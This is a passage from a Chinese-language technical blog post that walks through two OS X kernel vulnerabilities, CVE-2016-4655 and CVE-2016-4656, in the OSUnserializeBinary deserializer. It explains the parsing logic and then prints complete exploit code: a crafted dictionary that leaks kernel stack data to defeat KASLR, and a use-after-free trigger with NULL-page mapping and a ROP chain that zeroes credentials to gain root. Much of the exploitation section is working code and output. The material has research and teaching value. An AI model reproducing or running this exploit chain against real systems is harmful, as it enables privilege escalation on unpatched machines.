所对应的 value 值。因为 sym 现在已经被赋值了，if (sym) 分支将会被调用，dict-&gt;setObject(sym, o, true) 将会在字典中设置正确的键/值对。sym 将会被再次置 NULL，因为在下一次迭代中，我们假设遇到的是 key，然后是 value，然后循环。 我们快要完成 OSUnserializeBinary 了，下面继续： 123456789101112131415if (newCollect)&#123; if (!end) &#123; stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; &#125; parent = o; dict = newDict; array = newArray; set = newSet; end = false;&#125; 布尔变量 newCollect 仅仅在找到容器对象时被设置（查看一下 switch 中的 kOSSerializeDictionary, kOSSerializeArray 以及kOSSerializeSet cases）。如果这个容器对象的 end 没有被设置，就意味着在这一层，在这个容器之后，还有其他的对象。这种情况下，解析将会“缩进”，意味着我们开始了一个新的层次。 如果在新容器中，我们到达了最后一个对象，那么我们就要返回，然后继续反序列化之前容器中的下一个对象了（如果 kOSSerializeEndCollection 没有被设置，那么就表示在新容器之后，还有其他的对象）。 为了处理多个层次的缩进，每次遇到一个新的容器，而且容器之后还有对象，那么这个算法将会把父容器存入 stackArray 中，然后再开始反序列化新容器中的对象。当新容器结束的时候，父容器将会从 stackArray 中取出，然后继续反序列化之后的对象。 你可以看见父指针（指向包含当前对象的容器对象）会被存入 stackArray 数组中，在我们找到对象中的另一个 kOSSerializeEndCollecton 标志之前，新的对象都会被存在新的容器中。指示被存入哪个容器的三个通用变量（dict, array, and set）也会被设置为新容器。当找到 kOSSerializeEndCollecton 标志时，必要的话，算法将会对 level 递减： 123456789101112131415161718if (end)&#123; if (!stackIdx) break; /* j: when there are no more levels, deserialization is done; exit */ parent = stackArray[stackIdx]; /* j: pop parent off the stackArray */ stackIdx--; set = 0; dict = 0; array = 0; /* j: cast parent to proper container and resume deserialization */ if (!(dict = OSDynamicCast(OSDictionary, parent))) &#123; /* j: if parent can't be properly cast to a container, abort */ if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); &#125;&#125; 之前的容器将会从 stackArray 中取回，然后重新给 parent 赋值。之后三个通用变量互斥地重新转变为父类，所以对象又将会被存入之前的容器中。 如果新容器是父容器的最后一个元素，那么缩进就没有必要了，因为在新容器之后没有属于父容器的对象，所以我们只需要将所有的元素都存入新容器中，然后同时退出新容器和父容器即可。以下是一些 XML 例子： &lt;dict> &lt;string>str_1&lt;\string> &lt;boolean>1&lt;/boolean> &lt;string>str_2&lt;/string> &lt;boolean>1&lt;/boolean> &lt;dict> &lt;!-- new level (1) --> &lt;string>str_3&lt;/string> &lt;boolean>1&lt;/boolean> &lt;string>str_4&lt;/string> &lt;boolean>1&lt;/boolean> &lt;string>str_5&lt;/string> &lt;boolean>1&lt;/boolean> &lt;!-- END LEVEL 1! --> &lt;dict> &lt;!-- there are objects after this new container --> &lt;!-- we have to go back a level and push str_6 inside the outer dict --> &lt;string>str_6&lt;/string> &lt;boolean>1&lt;/boolean> &lt;!-- END LEVEL 0! --> &lt;/dict> &lt;dict> &lt;string>str_1&lt;/string> &lt;boolean>1&lt;/boolean> &lt;string>str_2&lt;/string> &lt;boolean>1&lt;/boolean> &lt;dict> &lt;!-- END LEVEL 0! --> &lt;string>str_3&lt;/string> &lt;boolean>1&lt;/boolean> &lt;string>str_4&lt;/string> &lt;boolean>1&lt;/boolean> &lt;string>str_5&lt;/string> &lt;boolean>1&lt;/boolean> &lt;!-- END LEVEL 1! --> &lt;dict> &lt;!-- there is nothing after this dict, do not indent and finally exit --> &lt;/dict> 我试图使事情更清楚，所以对已经比较直接的代码做了很多解释。解释代码永远不会比阅读代码更好，所以我建议你尝试通过阅读 OSUnserializeBinary 代码来消除自己的疑惑。 现在（终于！）是时候来看看这些漏洞，找到真正的乐趣了！ 漏洞分析在这篇博文中，我们要讨论的两个漏洞分别为 CVE-2016-4655 和 CVE-2016-4656。前面一个是 info-leak 漏洞，后面一个是 use-after-free 漏洞。我们先从 info-leak 开始，然后转向 use-after-free。 开始之前：我将尽量使事情直接明了，并在接下来的部分尽可能的讲解，同时我也发布了一些外部引用链接（可在文章末尾找到），以供你阅读，加深你的理解！ CVE-2016-4655 –– 内核信息泄漏好的，首先：什么是信息泄漏（info-leak）[1]？这是一个安全漏洞，使得攻击者可以访问到不应被访问的信息。很多情况下，这些信息就是内核地址。它们在帮助我们计算 KASLR slide[2] 时是十分有用的，KASLR slide 是指内核每次启动时都会偏移的一个随机量。我们需要这个 slide 来进行代码重用攻击[3]，比如 ROP[4]。 现在让我们一起来看一看在 OSUnserializeBinary 的 switch 语句中的 kOSSerializeNumber case吧： 123456789case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; 这里有什么不对的地方呢？它没有对 OSNumber 的长度做检查！我们可以创建一个任意长度的 number。通过在内核中注册一个用户客户端[5]对象，在其属性中包含一个畸形的OSNumber，然后读取该属性，使得内核读取超过 OSNumber 边界的字节，这个小疏忽很容易就变成了信息泄漏。因为一个 OSNumber 对象的最大为64位（检查数据是如何获得读入变量值），我们本不应该超过这个界限。我们将在之后讲解如何利用这一点。 CVE-2016-4656 –– 内核 UAF同样我们再一次提问：什么是 use-after-free[6]？这是一种当已被释放的内存仍然在被某个地方引用，然后使用它的情况。想象一下，一个对象已经被释放了，它最初的数据也已经被销毁了，但是程序里仍然有某个地方认为这个对象还存在着。这是造成多么糟糕的行为啊。 我们显然可以利用它，通过使我们的数据，在该对象被使用之前，重新占据已被释放的内存[7]。我们将会在之后讲解它的利用程序。 这个漏洞实际上是由于 OSSymbol 中负责反序列化 OSString 类型的字典键值代码造成的。 1234567891011...else&#123; sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) &#123; sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; &#125; ok = (sym != 0);&#125; 这段代码很好，注意到 o-&gt;release() 了吗？这里释放了 o 指针，在特定的循环中，这个指针指向的是 OSString 反序列化对象。出现什么问题了呢？你还记得之前的 objsArray 数组吗？就是那个存储所有反序列化对象的？这段释放代码实际上发生在 setAtIndex 宏被调用之后。这意味着已经被释放了的 OSString ，实际上还在被 objsArray 引用，因为 setAtIndex 宏并没有实现任何关于引用计数的机制，所以这个引用存储在数组中不会被移除。 在一般情况下，这是没有什么问题的，比如，不在 objsArray 中创建对其他对象的引用，但是让我们来看一看 switch 语句中的 kOSSerializeObject case： 123456case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; 正如我们前面所指出的那样，这段代码是用来创建对其他对象的引用。正是我们所需要的！这里也有一个非常棒的函数 retain，可以用来使用已被释放的对象。完美的 use-after-free！ 我们可以序列化一个字典，包含一个 OSString key，对应一些值，然后序列化一个 kOSSerializeObject 来引用这个 OSString，这个 OSString 将会在我们读取它的时候被释放，随后对已被释放的对象调用 retain。 利用程序在这最后一部分，我们将研究利用这个两个内核错误在 OS X 10.11.6上实现完整的 LPE。请注意：有许多的概念引用不在本博文讲解的范围内，我会发布一些外部链接来越过它们。 Exploiting CVE-2016-4655我们将从 info-leak 开始，正如我们之前所说的，info-leak 对于越过 KASLR 是非常有用的，通过获得内核偏移来进行。在打破 KASLR 之后，我们将准备发起一次完整的攻击，利用另一个漏洞，来获得代码执行权，使用 KASLR 偏移，使得正确执行我们的 ROP 成为可能，然后攻破系统。 我们可以在内核中创建一个用户客户端对象，并为它设置属性。这些属性只是一串通过字典来设置的键/值对。幸运的是，我们可以使用二进制格式来设置属性（因为我们可以直接调用 OSUnserializeXML 函数，这个函数会调用二进制数据情况下的 OSUnserializeBinary 函数），而不是传统的 XML 格式的数据。这让我们可以创建一个字典，包含畸形的 OSNumber，字典被用来设置为客户端对象的属性。 我们通过 IOServiceOpen 函数来连接内核服务，从而隐式地创建用户端。但是，我们将要使用的是一个私有函数，io_service_open_extended，这个函数是 IOServiceOpen 内部调用的。这个私有函数，以及一些我们将要用到的函数，都被定义在 IOKit/iokitmig.h 头文件中。注意，你的文件必须编译成32位的 Mach-O，否则不能调用这个函数（我猜测是遗留问题？）。 以下是 info-leak 利用计划回顾： 制作一个包含超长OSNumber的序列化二进制字典。 使用序列化字典在内核中的用户客户端对象中设置属性。 读取设置的属性（OSNumber），通过超长的大小泄漏相邻的数据。 使用一些读取的数据来计算 kernel slide。 以下是实际代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768uint64_t kslide_infoleak(void)&#123; kern_return_t kr = 0, err = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; io_service_t serv = 0; io_connect_t conn = 0; io_iterator_t iter = 0; uint64_t kslide = 0; void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte WRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endian WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) &#123; printf("(+) Dictionary is valid! Spawning user client...\n"); &#125; else return -1; serv = IOServiceGetMatchingService(master, IOServiceMatching("IOHDIXController")); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) &#123; printf("(+) UC successfully spawned! Leaking bytes...\n"); &#125; else return -1; IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); char buf[0x200] = &#123;0&#125;; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) &#123; printf("(+) Done! Calculating KASLR slide...\n"); &#125; else return -1;#if 0 for (uint32_t k = 0; k &lt; 128; k += 8) &#123; printf("%#llx\n", *(uint64_t *)(buf + k)); &#125;#endif uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf("(i) KASLR slide is %#016llx\n", kslide); return kslide;&#125; 制作字典我们将要使用 enum 中描述的那些来创建二进制序列化数据，一种较为简单的方式是分配内存，然后使用指针向其中写入掩码值。 1234void *dict = calloc(1, 512);uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0) 我们的宏是非常有用的，因为它使我们可以向已分配的内存中写入数据，并且使索引在每次使用后更新。 所以，使用我们之前讲过的知识，现在让我们用 XML 写下字典吧： &lt;dict> &lt;symbol>AAA&lt;/symbol> &lt;number size=0x200>0x4141414141414141&lt;/number> &lt;/dict> 转换为二进制： 123456789WRITE_IN(dict, (0x000000d3)); // signature, always at the beginningWRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entriesWRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byteWRITE_IN(dict, (0x00414141)); // 'AAA' key + NUL byte in little-endianWRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size numberWRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big number 在不创建用户客户端的情况下测试我们的字典是否有效，我们可以使用 io_service_get_matching_services_bin 私有函数（同样是在 IOKit/iokitmig.h 头文件中），之后在触发 UAF 漏洞中也会使用到。 1234567host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr == KERN_SUCCESS) &#123; printf("(+) Dictionary is valid! Spawning user client...\n");&#125; else return -1; 如果返回值等于0，那么我们创建的字典将会被正确解析，当然也就有效。现在我们已经确定的字典的有效性，那么我们可以通过它来设置属性了，继续来创建用户客户端。 产生用户客户端就像之前提到的那样，我们将要通过在 service 中调用 io_service_open_extended 来产生用户客户端。使用什么服务并不重要，只要它能提供客户端。在这个例子中，我们通过打开 IOHDIXController（被用来存储磁盘数据）服务，来产生 IOHDIXControllerUserClient 对象，所以我们的代码是这样的。 1234567serv = IOServiceGetMatchingService(master, IOServiceMatching("IOHDIXController"));kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);if (kr == KERN_SUCCESS) &#123; printf("(+) UC successfully spawned! Leaking bytes...\n");&#125; else return -1; 首先，我们要获得服务的一个端口，可以使用 IOServiceGetMatchingService 函数，这个函数将会从 IORegistry 中过滤出我们的服务，通过包含服务名字（IOServiceMatching）的匹配字典。然后我们使用私有函数 io_service_open_extended 打开这个服务（产生用户客户端）。这可以让我们直接指定属性。 现在，客户端是用我们指定的属性来创建的。我们怎样访问它呢？我们需要在 IORegistry 中手动迭代，直到找到我们的客户端。然后，我们将会读取属性，从而造成 info-leak。 12IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &amp;iter);io_object_t object = IOIteratorNext(iter); 这段代码所做的是，创建一个 io_iterator_t 并且将其设置为 IORegistry 中的 serv。 serv 只是一个代表内核中实际驱动对象的 Mach 端口。因为用户客户端是主驱动对象的客户端，所以在 IORegistry 中，我们的用户客户端将会紧挨着驱动对象之后创建。因此，我们只需增加一次迭代，就可以获得表示我们用户客户端的 Mach 端口。一旦用户客户端对象在内核中被创建，且我们在 IORegistry 中找到它，那么我们就可以读取它的属性，来触发 info-leak 了。 读取属性12345678char buf[0x200] = &#123;0&#125;;mach_msg_type_number_t bufCnt = 0x200;kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&amp;buf, &amp;bufCnt);if (kr == KERN_SUCCESS) &#123; printf("(+) Done! Calculating KASLR slide...\n");&#125; else return -1; 我们再次使用一个私有函数 io_registry_entry_get_property_bytes。这个函数跟 IORegistryEntryGetProperty 相似，但是可以让我们直接获取原始字节。所以，通过它，buf 缓冲区将会包含我们的已被泄漏的字节。让我们打印一下，看看这里都有什么吧： 123for (uint32_t k = 0; k &lt; 128; k += 8) &#123; printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));&#125; 以下是输出： 0x4141414141414141 // our valid number 0xffffff8033c66284 // 0xffffff8035b5d800 // 0x4 // other data on the stack between our valid number and the ret addr... 0xffffff803506d5a0 // 0xffffff8033c662b4 // 0xffffff818d2b3e30 // 0xffffff80037934bf // function return address ... 第一个值，0x4141414141414141,是我们的实际数据，还记得吗？剩下的值都是从内核栈上面泄漏出来的数据。现在，查看从用户客户端读取属性的内核代码是非常有用的，这样我们就可以更清楚的了解发生了什么。实际代码存在于 is_io_registry_entry_get_property_bytes 函数中，被io_registry_entry_get_property_bytes 调用。 iokit/Kernel/IOUserClient.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* Routine io_registry_entry_get_property */kern_return_t is_io_registry_entry_get_property_bytes( io_object_t registry_entry, io_name_t property_name, io_struct_inband_t buf, mach_msg_type_number_t *dataCnt )&#123; OSObject * obj; OSData * data; OSString * str; OSBoolean * boo; OSNumber * off; UInt64 offsetBytes; unsigned int len = 0; const void * bytes = 0; IOReturn ret = kIOReturnSuccess; CHECK( IORegistryEntry, registry_entry, entry );#if CONFIG_MACF if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name)) return kIOReturnNotPermitted;#endif obj = entry-&gt;copyProperty(property_name); if( !obj) return( kIOReturnNoResources ); // One day OSData will be a common container base class // until then... if( (data = OSDynamicCast( OSData, obj ))) &#123; len = data-&gt;getLength(); bytes = data-&gt;getBytesNoCopy(); &#125; else if( (str = OSDynamicCast( OSString, obj ))) &#123; len = str-&gt;getLength() + 1; bytes = str-&gt;getCStringNoCopy(); &#125; else if( (boo = OSDynamicCast( OSBoolean, obj ))) &#123; len = boo-&gt;isTrue() ? sizeof("Yes") : sizeof("No"); bytes = boo-&gt;isTrue() ? "Yes" : "No"; &#125; else if( (off = OSDynamicCast( OSNumber, obj ))) &#123; /* j: reading an OSNumber */ offsetBytes = off-&gt;unsigned64BitValue(); len = off-&gt;numberOfBytes(); bytes = &amp;offsetBytes;#ifdef __BIG_ENDIAN__ bytes = (const void *) (((UInt32) bytes) + (sizeof( UInt64) - len));#endif &#125; else ret = kIOReturnBadArgument; if( bytes) &#123; if( *dataCnt &lt; len) ret = kIOReturnIPCError; else &#123; *dataCnt = len; bcopy( bytes, buf, len ); &#125; &#125; obj-&gt;release(); return( ret );&#125; 我们是读取的 OSNumber 类型，所以直接看 OSNumber 的情况： 123456789...else if( (off = OSDynamicCast( OSNumber, obj ))) &#123; offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */ len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */ bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */ ...&#125;... 然后，跳出 if-else 语句： 12345678if( bytes) &#123; if( *dataCnt &lt; len) ret = kIOReturnIPCError; else &#123; *dataCnt = len; bcopy( bytes, buf, len ); /* j: this leaks data from the stack */ &#125;&#125; 当 bcopy 执行复制操作时，它将会从 bytes 指针中一直读取之前我们构造的那个超过常规的长度的字节，而 bytes 指针指向的是一个栈变量，从而可以有效地从栈上读取泄漏的数据。之后，它将会读取到存在栈上的函数的返回地址。正如我们所知道的那样，这个地址可以在 kernel 二进制文件中对应找到它偏移前的静态地址。所以，通过用我们从栈中得到的泄漏地址（偏移后的）减去对应的静态地址（未偏移的）。我们就能得到内核偏移（kernel slide）！ 计算内核偏移所以，我们需要找到未偏移（unslid）的内核地址。打开你喜欢的反编译软件（本例中用的是 Hopper，因为它比 IDA 更快），加载 kernel 文件，找到 is_io_registry_entry_get_property_bytes 函数。 现在，我们只需要找到这个函数的 Xrefs。 Hopper 把 Xrefs 列在函数开始的地方的右侧，在 IDA 中需要使用 CMD-X 或者 CTRL-X。 ; XREF=sub_ffffff80003933c0+250 ... ffffff80003934ba call _is_io_registry_entry_get_property_bytes /* the actuall call */ ffffff80003934bf mov dword [ds:r14+0x28], eax /* here's the function return address! */ ... 在 x86-64 ISA 约定中，call 指令会将地址 0xffffff80003934bf（返回地址）push 到栈中。这个地址会在运行时被偏移，所以现在回去看看我们泄漏的数据吧。 0x4141414141414141 // our valid number ... 0xffffff80037934bf // function return address 现在我们知道地址 0xffffff80037934bf 实际上就是 0xffffff80003934bf 偏移后的地址。让我们来做个数学计算： 0xffffff80037934bf - 0xffffff80003934bf = 0x3400000 这也是最后一部分的代码： 12345uint64_t hardcoded_ret_addr = 0xffffff80003934bf;kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;printf("(i) KASLR slide is %#016llx\n", kslide); 当然也可以动态获取我们需要的那个 kernel 文件中的静态地址，但是这已经超出这篇文章的范围了。 现在我们已经有了 slide！在你自己的例子中，这个值将（非常可能）会不同，并且会在每次重启之后改变。我们现在可以创建一个函数的 ROP 链了，然后再触发 UAF 漏洞来执行它，从而获得 root 权限。让我们继续吧！ Exploiting CVE-2016-4656现在我们已经有了 kernel slide，我们可以通过 UAF 来继续获得权限。要在各种类型的平台上利用 UAF 漏洞，重要的是要知道堆分配器（heap allocator）是如何工作的。这是因为只有当你对分配器是如何进行分配/释放的操作，有一个清晰的了解之后，才能成功的操控它们。 XNU 的堆分配器被称为 zalloc，并且有大量的在线文档讲解它[8][9][10]。你也可以阅读位于 XNU 源码树 osfmk/kern/zalloc.h 以及 osfmk/kern/zalloc.c 中的代码。为了让你能更好的理解之后的利用程序中，我将快速过一遍这些基本概念。 简单地讲，zalloc 在 zones 中组织分配，一个 zone 表示大小相同的分配列表。 最常用的区域是 kalloc 区域。 kalloc 是一个建立在 zalloc 之上的，更高级别的内核分配器。它将请求到的分配大小向上舍入到最接近的二的幂值。因此，注册的 kalloc 区域持有两个分配的权利。在 OS X 上使用 zprint 命令查看输出： [jndok:~jndok(Debug)]: sudo zprint | grep kalloc kalloc.16 16 1148K 1167K 73472 74733 62742 4K 256 kalloc.32 32 2160K 2627K 69120 84075 55581 4K 128 kalloc.48 48 3448K 3941K 73557 84075 67638 4K 85 kalloc.64 64 5236K 5911K 83776 94584 80523 4K 64 kalloc.80 80 1100K 1167K 14080 14946 13586 4K 51 kalloc.96 96 4160K 5254K 44373 56050 41922 8K 85 kalloc.128 128 2220K 2627K 17760 21018 16915 4K 32 kalloc.160 160 704K 1037K 4505 6643 4115 8K 51 kalloc.256 256 8004K 8867K 32016 35469 30851 4K 16 kalloc.288 288 740K 768K 2631 2733 2179 20K 71 kalloc.512 512 1900K 2627K 3800 5254 3266 4K 8 kalloc.1024 1024 3048K 3941K 3048 3941 2588 4K 4 kalloc.1280 1280 400K 512K 320 410 201 20K 16 kalloc.2048 2048 1872K 2627K 936 1313 909 4K 2 kalloc.4096 4096 6532K 8867K 1633 2216 515 4K 1 kalloc.8192 8192 3160K 3503K 395 437 269 8K 1 这些区域只持有指定大小的分配。被释放的元素保存在一个链表中，其中最近被释放的元素附在结尾处。这是非常重要的，因为这意味着最近被释放的元素区域首先被重新分配。换句话说，如果一个元素被释放了，并且我们足够快，那么我们就可以设法重新分配它。 如何管理重新分配被称作分配 allocation primitive。它基本上是一种可靠第分配所需数量的内核内存的方法。我们将要使用的 allocation primitive 是在字典中 OSString 之后简单地创建一个对象。正如我们已经知道的，OSUnserializeBinary 会为反序列化对象分配内存，这是非常好的。我们还需要的是要准备地知道我们需要分配多少内存以及我们需要向其中写入什么数据。 在我们这个特例中，被释放的元素是 OSString，大小为32字节。也就是说每一个 OSString 都将会被访苏 kalloc.32 区域。因此，为了重新分配已被释放的 OSStirng，我们需要会被分配在同一区域的数据。 OSData 就是一个完美的候选者，因为我们可以通过字典来控制它的缓冲区数据，声明32字节，然后得到重分配。 OSString 将会在我们创建 kOSSerializeObject 引用指向它时被再次使用（还记得 retain 函数吗？）。 好了，现在来总结一下我们已经知道的：我们知道一旦字典被反序列化，则 OSString 的 key 值将会被释放，基于此，我们可以在这之后立即序列化大小为32字节的 OSData，来占据内存。在OSData之后，我们将会序列化一个指向 OSString的引用，这个引用将会在反序列化的时候调用 retain 函数，这样就会触发漏洞，NICE! 最后一件事就是要知道在 OSData 的缓冲区里填充些什么数据。 为此，想想 retain 函数。如果你了解 C++ 的调用约定的话，你可能会知道 OSString 是 OSObject 的子类，所以 retain 实际上是在 OSObject 里实现的，控制流将会通过 vtable（虚表），来调用恰当的父类实现（因为 OSString 并没有实现 retain ）。也就是说，我们需要制造一个假的 vtable，来控制执行流程。内核将会认为我们的假 vtable 是完全有效的，而这个假的 vtable 将会包含一个指针指向我们的 stack pivot（栈翻转），而不是父类的 retain。 假的虚表指针将会位于 OSData 缓冲区的开始处，因为在有效的 C++ 对象中，虚表指针通常都是位于对象的开始处。我们将会把我们的虚表以及 stack pivot 放在 NULL 页面中，因为 OSData 中的 NULL 地址更容易被控制。其他地址可能会被某些针对他们的操作更改，而 NULL 不会改变。也就是说，我们要将 OSData 的数据全部填充为0。 跟 info-leak 一样，在浏览代码之前，让我们来看一下 UAF 利用程序的计划： 制作一个触发 UAF 的二进制字典，用被0填充的 OSData 重新分配被释放的 OSString 区域。 制作 NULL page。 在 NULL page 的0x20偏移处放置 stack pivot （这将使得执行程序跳转到转移链）。 在 NULL page 的0x0偏移处放置一个小的转移链（这将会使执行程序跳转到主链）。 触发漏洞。 用现在已经提升的权限，产生一个 shell。 以下是代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697void use_after_free(void)&#123; kern_return_t kr = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; /* craft the dictionary */ printf("(i) Crafting dictionary...\n"); void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries WRITE_IN(dict, (kOSSerializeString | 4)); // string 'AAA', will get freed WRITE_IN(dict, (0x00414141)); WRITE_IN(dict, (kOSSerializeBoolean | 1)); // bool, true WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol 'BBB' WRITE_IN(dict, (0x00424242)); WRITE_IN(dict, (kOSSerializeData | 32)); // data (0x00 * 32) WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol 'CCC' WRITE_IN(dict, (0x00434343)); WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1)); // ref to object 1 (OSString) /* map the NULL page */ mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK); printf("(i) Leaking kslide...\n"); SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide /* set the stack pivot at 0x20 */ *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot /* build ROP chain */ printf("(i) Building ROP chain...\n"); rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_current_proc")); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred")); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get")); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_bzero")); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return")); /* chain transfer, will redirect execution flow from 0x0 to our main chain above */ uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; /* trigger */ printf("(+) All done! Triggering the bug!\n"); host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return;&#125; 在这个片段中我使用了很多来自外部库的代码，它们在 GitHub 上，对于这篇文章的其他代码，它们也同样有效。只需要记住 PUSH_GADGET 宏是被用来向 ROP 链中写入值的就行了，就像序列化数据的 WRITEN_IN 一样。一些 gadget 宏比如 ROP_POP_XXX 是用来在 kernel 文件中寻找 ROP gadgets 的，find_symbol_address 调用也是做的同样的事情，只是它是被用来寻找函数的。ROP 链中的函数以及 gadgets 的地址在插入其中之前，当然也已经构造好偏移了（使用我们之前获得的偏移）。 制作字典这部分跟我们之前所做的非常相似，但是字典的内容不同。 XML 格式如下： &lt;dict> &lt;string>AAA&lt;/string> &lt;boolean>true&lt;/boolean> &lt;symbol>BBB&lt;/symbol> &lt;data> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;/data> &lt;symbol>CCC&lt;/symbol> &lt;reference>1&lt;/reference> &lt;!-- we are referring to object 1 in the dictionary, the string --> &lt;/dict> 显然，我们在字典的第二个 Key 处使用了 OSSymbol 来避免重分配已被释放的 OSString 区域。 OSData 数据将会被重新分配在 OSString 的区域，当调用 retain 的时候（ OSUnserializeBinary 解析引用时），内核将会从我们构造的缓冲区内读取 vtable 指针。这个指针位于缓冲区的首 8 字节，且为0。 内核将会解引用这个指针，添加 retain 偏移量，来读取存储在虚表中的父类 retain 指针。这个偏移量是 0x20 (32)，也就是意味着 RIP 会跳转到 0x20 处。 在很多系统中，这是不可利用的，因为制作 NULL 是不可能的，但是在 OSX 中并不一定。因为某些遗留原因，Apple 并没有在32位的二进制中强制要求 __PAGEZERO 段。这也意味着，如果我们使用32位编译的二进制（确实也是，因为之前我们使用了 IOKit 的 APIs ），那么即使缺少了 __PAGEZERO 段，内核也会执行它。换句话说，我们可以很容易的 map NULL ，然后把我们的 stack pivot 放在那儿。 制作 NULL page就像我们之前说的，在32位二进制中，Apple 对 __PAGEZERO 段并没有强制要求。通过将我们的二进制编译为32位，并附上 -pagezero_size,0 的标志，我们可以使 __PAGEZERO 段失效，并在运行时制作 NULL page 代码： 1234567mach_vm_address_t null_map = 0;vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);if (kr != KERN_SUCCESS) return; Pivoting the stack在内核解引用我们构造的指向 NULL+0X20 